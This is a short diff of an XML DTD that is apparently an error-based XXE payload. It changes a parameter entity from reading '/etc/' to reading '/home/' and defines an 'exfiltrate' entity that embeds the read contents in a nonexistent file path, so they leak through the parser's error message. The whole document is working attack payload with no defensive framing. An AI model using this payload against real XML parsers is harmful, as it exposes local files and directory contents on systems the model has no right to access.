@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/">
+<!ENTITY % file SYSTEM "file:///home/">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '/thisisnotafile/%file;'>">
 %eval;
 %exfiltrate;
